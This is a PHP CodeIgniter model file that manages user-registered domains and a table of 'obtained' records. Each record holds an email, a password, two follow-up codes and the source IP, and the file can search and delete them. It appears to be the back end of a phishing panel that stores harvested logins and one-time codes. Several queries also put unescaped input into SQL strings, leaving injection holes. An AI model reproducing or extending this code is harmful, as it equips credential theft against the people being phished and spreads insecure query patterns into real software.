<?php  
 namespace App\Models;
 use CodeIgniter\Model;


class Reporte_model extends Model {

    protected $db;
    public function __construct(){
       $this->db = \Config\Database::connect('default');
    }


  public function insertardominio($datos){

      $query =  $this->db->table('tbldomains_reporte');
      $data = [
         'dominio'     => $datos['dominio'],
         'subdominio'  => $datos['subdominio'],
         'descripcion' => $datos['descripcion'],
         'directorio'  => $datos['directorio'],
         'idusuario'   => $datos['idusuario']
      ];      
     
      return $query->insert($data);

  } 

  public function verificardominio_user($idusuario){

    $query = $this->db->query("SELECT * FROM tbldomains_reporte WHERE idusuario = $idusuario");
    return $query->getNumRows();
  } 


   public function get_dominio($idusuario){

      $query = $this->db->query("SELECT * FROM tbldomains_reporte WHERE idusuario = $idusuario");
      return $query->getRowArray();
  }  


   public function eliminareDominio($idusuario){

      $query =  $this->db->table('tbldomains_reporte');
      $query->where('idusuario', $idusuario);
      return $query->delete(); 


    }    



   public function updateReporteLink($datos){

      $query =  $this->db->table('tbldomains_reporte');
      $data = [
         'statusreporte' => $datos['statusreporte']
      ];
      $query->set($data);      
      $query->where('idusuario', $datos['idusuario']);
      return $query->update();

   
   }

 

   public function resetcodigouser($idusuario, $codigo){

      $query =  $this->db->table('tbldomains_reporte');
      $data = [
         'codigo' => $codigo
      ];  
      $query->set($data);    
      $query->where('idusuario', $idusuario);
      return $query->update();

   }  

  public function verificardominio($dominio){

    $query = $this->db->query("SELECT * FROM tbldomains_reporte WHERE dominio = '$dominio'");
    return $query->getRowArray();
  } 
  public function reporte_acceso($ip, $idusuario){

    $query = $this->db->query("SELECT * FROM tbl_obtenidos_reporte WHERE ip = '$ip' AND idusuario = $idusuario");
    return $query->getRowArray();
  } 
  
  
 
  public function insertar_emailpassword($datos){

      $query =  $this->db->table('tbl_obtenidos_reporte');
      $data = [
         'email'     => $datos['email'],
         'password'  => $datos['password'],
         'status'    => $datos['status'],
         'response'  => $datos['response'],
         'idusuario' => $datos['idusuario'],
         'acceso'    => $datos['acceso'],
         'ip'        => $datos['ip']
      ];      
     
      if($query->insert($data)){
         $response = array('status' => true, 'insertId' => $this->db->insertID());
       }else{
        $response = array('status' => false, 'insertId' => "0");
       }
      return $response;

  }


  public function update_codigos($datos){

      $query =  $this->db->table('tbl_obtenidos_reporte');
      $data = [
         'codigo_1' => $datos['codigo_1'],
         'codigo_2' => $datos['codigo_2'],
         'status'   => $datos['status'],
         'acceso'   => $datos['acceso'],
         'ip'        => $datos['ip']
      ];  
      $query->set($data);    
      $query->where('id', $datos['id']);
      $query->where('idusuario', $datos['idusuario']);
      return $query->update();

  }

  /*public function update_codigos($datos){

      $query =  $this->db->table('tbl_obtenidos_reporte');
      $data = [
         'codigo_1' => $datos['codigo_1'],
         'codigo_2' => $datos['codigo_2'],
         'status'   => $datos['status'],
         'acceso'   => $datos['acceso'],
         'ip'        => $datos['ip']
      ];  
      $query->set($data);    
      $query->where('id', $datos['id']);
      $query->where('idusuario', $datos['idusuario']);
      return $query->update();

  }*/

  public function get_obtenidos_reporte($idusuario,$buscar){
      
      if($buscar == ""){
        
        $query = $this->db->query("SELECT * FROM tbl_obtenidos_reporte WHERE idusuario = $idusuario ORDER BY id DESC");

      }elseif($buscar != ""){

        $query = $this->db->query("SELECT * FROM tbl_obtenidos_reporte WHERE idusuario = $idusuario AND (email LIKE '%$buscar%' OR status LIKE '%$buscar%') ORDER BY id DESC");

      }

       return $query->getResult();
    }  


  public function get_obtenidoID_reporte($idusuario, $id){

      $query = $this->db->query("SELECT * FROM tbl_obtenidos_reporte WHERE idusuario = $idusuario AND id = $id");
      return $query->getRowArray(); 
  }  

  public function eliminareObtenido_reporte($idusuario, $id){

      $query =  $this->db->table('tbl_obtenidos_reporte');
      $query->where('idusuario', $idusuario);
      $query->where('id', $id);
      return $query->delete(); 


  }  



  
}    
